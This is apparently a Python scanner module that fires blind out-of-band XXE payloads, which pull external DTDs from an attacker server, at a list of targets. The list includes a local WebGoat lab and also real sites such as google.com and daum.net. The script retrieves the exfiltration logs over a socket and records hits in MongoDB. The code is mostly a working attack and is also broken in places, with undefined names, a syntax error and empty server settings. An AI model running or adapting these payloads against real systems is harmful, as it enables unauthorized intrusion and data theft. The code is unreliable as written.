import requests, copy, sys, re, socket, time
from pymongo import MongoClient
from pymongo.cursor import CursorType

server_url = ""

xxe_urls = [ 
            "http://google.com",
            "http://localhost:8080/WebGoat/attack?Screen=87365&menu=1700",
            "http://daum.net"
            ]

session = requests.Session()
mongo_host = ""                     # static & main
mongo_port = 27017                              # static & main
mongo = MongoClient(mongo_host, mongo_port)     # static & main 

class schema :
    def __init__(self, type : str) :
        self.type = type
        self.url = ''
        self.isHack = False
        self.totUse = 0
        self.useDTD = str()

    def setUrl(self, url : str) :
        self.url = url

    def setisHack(self) :
        self.isHack = True

    def settotUse(self, totUse : int) :
        self.totUse = totUse

    def setuseDTD(self, useDTD : str) :
        self.useDTD += useDTD
        self.useDTD += "\n"


def sendMsg(client_socket, msg) :
    client_socket.sendall(msg)

def getMsg(client_socket) :
    data = client_socket.recv(1024)
    return data


def insertItem(schema : schema):
    global mongo
    db_name = "WAS"     # static 
    collection_name = "xxe" #static
    
    data = {"type" : schema.type , "url" : schema.url , "isHack":schema.isHack, "totUse" : schema.totUse, "useDTD" : schema.useDTD}

    mongo[db_name][collection_name].insert_one(data)



# routine : 메인 호출 부분!
# argument : None
# return value : None
def xxeBlindOutofbandGetinfo():
    sendMsg(client_socket, "reset".encode())

    # 서버에 있는 dtd 파일의 수를 http.get 요청으로 받아옴.
    response = requests.get(server_url + "dtd_count")
    dtd_cnt = int(response.text) 

    # 파일 수 만큼 exploit 보내기
    submitRequest(dtd_count)

    # report 출력
    finalDetail()


# routine : 실제 exploit을 보냄
# argument : dtd 파일 인덱스
# return value : None
def submitRequest(dtd_cnt : int):
    global xxe_url, session


    headers = {'Content-Type': 'application/xml;charset=UTF-8',
                'Accept': 'application/xml' }

    for xxe_url in xxe_urls:
        url = '{}url/{}'.format(server_url,xxe_url)
        requests.get(url)   

        for i in range(dtd_cnt):
            # Crafting XXE Payload
            payload = '<?xml version=\"1.0\" ?>\r\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{}exploit/exploit{}.dtd"> %xxe; ]>'.format(server_url , i)
            response = session.post(xxe_url, data = payload, headers = headers)
            if response.status_code != 200:
                print("\n\n   [ ERROR : {} ] \n\n   ** Response status code : {}  \n\n".format("Failed exploit payload",response.status_code))
    

    url = '{}end/{}'.format(server_url,xxe_url)
    requests.get(url)



# routine : 최종 report 를 출력해주는 부분
# argument : None
# return value : None
def finalDetail():
    resultRequest()
    



# routine : 공격자 서버에서 공격 log 를 받아옴 
# argument : None
# return value : 로그를 string 형태로 반환 ( 필터링되지 않은 상태 )

def resultRequest():
    sendMsg(client_socket, "result".encode("utf-8"))
    data = getMsg(client_socket)
    sendMsg(client_socket, data)
    data_transferred = 0 
    result = str()


    if data == None:
        print("\n\n   [ ERROR : File does not exist in server ] \n\n")
        return "RESULT_ERROR"

    
    try:
        while data:
            result += repr(data)
            data_transferred += len(data)
            data = getMsg(client_socket).decode("utf-8")
            sendMsg(client_socket, data.encode("utf-8"))
            if(data == "end"):
                break
    except Exception as ex:
            print("\n\n   [ ERROR : ", ex ," ]  \n\n")
            return "RESULT_ERROR"


    print("\n\n** [ LOG ] Size of transferred data  : {} bytes \n\n".format(data_transferred))
    craft_result(result)
    


# routine : 받아온 log를 필터링 함
# argument : 원본 로그 
# return value : 필터링한 로그 

def craftResult(result : str)
    result = '"""{}"""'.format(result)    
    new_schema = schema("OOB")     
    result = result.split("\\n")
    url = str()

    for line in result:
        try:
            if( int(line.split(' ')[8]) != 404):
                continue
                # 서버에서 받아온 결과(log file)를 필터링 하는 부분은 더 다양한 시도를 해보고 수정 될 수 있음
        except:
            continue


        line = re.sub("''","",line)
        if(line.find('/exploit/') != -1) : 
            new_schema.setuseDTD(line[line.find('/exploit/'):line.find('http/1.1')])
        else :
            if(new_schema.url) :
                count_use = new_schema.useDTD.count('\n')
                if(count_use > 0) :
                    new_schema.setisHack()
                    new_schema.settotUse(count_use + 1)
                else : new_schema.settotUse(count_use)
                
                insertItem(new_schema)

                if(line.find('end') != -1):
                    break

                new_schema = schema("OOB")
            new_schema.setUrl(line[line.find('/url') + 5:])
    


# 나중에 코드 전부 합칠때, 이 기능은  메인에서 구현되고 session 만 전역변수로 빼와야 함.
def connect_session() -> bool:    
    global session

    session_url = "http://localhost:8080/WebGoat/j_spring_security_check"
    login_data = {"username" : "guest" , "password" : "guest"}
    response = session.post(session_url, data = login_data)

    if response.status_code != 200:
        print("\n\n   [ ERROR : {} ] \n\n   ** Response status code : {} \n\n".format("Failed login", response.status_code))
        return False

    return True



if __name__ == "__main__":

    server_host = ''
    server_port = ''
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 소켓 연결 구현도 메인에서 하고, client_socket 만 전역변수로 빼와야 함.
    client_socket.connect((server_host,server_port))

    if connect_session() == True :
        xxeBlindOutofbandGetinfo()


    client_socket.close() # 모든 공격이 끝난 후! 닫아야 함. 


